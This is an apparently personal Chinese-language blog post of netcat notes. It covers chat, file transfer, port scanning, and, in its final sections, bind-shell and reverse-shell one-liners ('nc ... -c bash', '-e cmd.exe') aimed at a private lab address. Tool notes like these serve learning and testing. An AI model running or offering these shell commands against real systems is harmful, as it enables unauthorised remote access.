---
layout: post
title:  "那什麼鬼 -- netcat 基礎用法"
date:   2021-10-06 09:12:10 +0800
author: "summer"
categories: 那什麼鬼
header-style: text
tags:
  - 那什麼鬼
  - linux
  - netcat
  - 網路
---
netcat 是一個多功能的網路工具，紀錄一下他的常用功能

## 即時對談

在要當 server 的機器 192.168.67.128 上執行

```bash
nc -l -p 12345
```

在 client 端執行

```bash
nc 192.168.67.128 12345
```

就能有簡單的交談功能

## 傳送檔案

在要接收檔案的機器上執行

```bash
nc -l -p 12345 > out.file
```

在要傳送檔案的機器上執行

```bash
nc -N 192.168.67.128 12345 < out.file
```

-N 是讀到時 EOF 結束連線

或

```bash
nc -w 3 192.168.67.128 12345 < out.file
```

-w 是設定 timeout 傳送完成後 3 三秒中止連線

如果要傳送多檔案，可以打包後再傳

## port scan

```bash
$nc -z -v -n 192.168.67.128 21-25
```

這會掃描目標位置的 21-25 port

-z 為不帶資料
-v 為顯示詳細
-n 為不進行解析

## get shell

如果你的 nc 沒有 -c -e ，可以安裝 nmap 使用其中的 ncat ，指令是一樣的

-c 為執行命令
-e 為執行程式

### linux

server

```bash
nc -lp 12334 -c bash
```

client

```bash
nc 192.168.67.128 12334
```

### windows

server

```bash
nc -lp 12334 -e cmd.exe
```

client

```bash
nc 192.168.67.128 12334
```

## Reverse Shell

### linux

server

```bash
nc -lp 12334
```

client

```bash
nc 192.168.67.128 12334 -c bash
```

### windows

server

```bash
nc -lp 12334
```

client

```bash
nc 192.168.67.128 12334 -e cmd.exe
```
